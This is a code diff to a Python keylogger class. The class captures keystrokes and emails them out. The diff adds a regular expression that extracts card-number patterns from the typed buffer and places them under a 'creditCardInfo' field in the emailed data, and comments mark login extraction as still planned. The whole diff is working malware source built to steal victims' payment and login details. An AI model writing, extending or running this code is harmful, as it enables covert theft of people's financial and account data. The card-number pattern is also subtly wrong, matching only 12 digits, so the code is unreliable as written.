@@ -2,6 +2,9 @@ import keyboard
 import time
 from emailer import Emailer
 import json
+import re
+
+CREDIT_CARD_NUMBER_REGEXP = re.compile("[0-9]{4}[ ]?[0-9]{4}[ ]?[0-9]{4}")
 
 class Keylogger:
     def __init__(self, email: str, password: str) -> None:
@@ -30,17 +33,22 @@ class Keylogger:
             if event.name == "shift" or event.name ==  'right shift':
                 self.shift_keys -= 1
             
-    def __format_local_buffer(buffer) -> dict:
+    def __get_credit_card_info(self, buffer: str) -> dict:
+        credit_card_info = [{"creditCardNumbers": re.findall(CREDIT_CARD_NUMBER_REGEXP, buffer)}]
+        
+        return credit_card_info
+
+    def __flag_data(self, buffer: str) -> dict:
         # Check email with regex
         # Check digits
-        formatted_local_buffer = {"loginInfo": [], "creditCardInfo": []}
+        formatted_local_buffer = {"loginInfo": [], "creditCardInfo": self.__get_credit_card_info(buffer)}
 
         return formatted_local_buffer
 
     def __email_local_buffer(self, emailer: Emailer) -> bool:
         
         # Flag stuff
-        flagged_objects = self.__format_local_buffer(self.local_buffer)
+        flagged_objects = self.__flag_data(self.local_buffer)
 
         data = {"raw": self.local_buffer_raw, 'formatted': self.local_buffer, "flagged": flagged_objects}
 
